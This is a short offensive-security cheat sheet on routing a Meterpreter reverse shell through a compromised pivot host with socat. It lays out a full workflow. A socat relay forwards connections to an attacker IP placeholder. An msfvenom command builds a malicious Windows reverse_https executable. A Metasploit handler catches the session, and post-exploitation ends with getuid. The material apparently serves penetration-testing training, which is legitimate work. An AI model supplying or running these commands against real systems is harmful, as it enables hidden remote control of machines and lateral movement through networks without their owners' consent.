### **Socat Redirection for Reverse Shells**

**Socat** is a bidirectional relay tool used to create pipe sockets between two independent network channels. It serves as a **redirector** that listens on a compromised host and forwards incoming data to a secondary IP and port. This technique is used to establish connectivity between a target and an attack machine without relying on **SSH tunneling**.

---

#### **Operational Workflow**

1. **Start the Socat Redirector:** Execute this on the compromised pivot host. This creates a listener that stays open to forward traffic to the attack machine.
2. **Generate the Payload:** Create a malicious executable configured to connect to the **pivot host** rather than the attack machine directly.
3. **Configure the Listener:** Set up a handler on the attack machine to catch the redirected connection.
4. **Execute and Verify:** Transfer the payload to the target and execute it to receive a session via the pivot.

---

#### **1. Socat Redirector Setup**

Run this on the **compromised pivot host** (e.g., a Linux web server) to listen for the target's callback and relay it to the attack machine.

```
socat TCP4-LISTEN:<PORT_ON_PIVOT>,fork TCP4:<ATTACK_IP>:<LISTENER_PORT>
```

|Parameter|Function|
|:--|:--|
|`TCP4-LISTEN:<PORT>`|Sets the port on the pivot host to listen for the incoming reverse shell.|
|`fork`|Enables socat to handle multiple connections simultaneously.|
|`TCP4:<ATTACK_IP>:<PORT>`|Defines the destination attack machine and port where the listener is running.|

---

#### **2. Payload Generation**

The payload must be configured with the **Pivot IP** as its `LHOST` because the target cannot communicate with the attack machine directly.

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<PIVOT_IP> LPORT=<PORT_ON_PIVOT> -f exe -o <FILENAME>.exe
```

---

#### **3. Metasploit Listener Configuration**

Start the listener on the **attack machine**. The `LPORT` here must match the destination port defined in the **socat** command.

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport <LISTENER_PORT>
msf6 exploit(multi/handler) > run
```

---

#### **Attack Implications**

- **Traffic Routing:** Once the target executes the payload, it connects to the pivot host. Socat receives this connection and redirects all traffic to the attack machine's listener.
- **Session Establishment:** Successful redirection results in a **Meterpreter session** originating (from the attack machine's perspective) from the pivot host's IP.
- **Post-Exploitation:** Upon receiving the shell, standard discovery commands can be used to confirm the compromised identity on the internal target.

```
meterpreter > getuid
```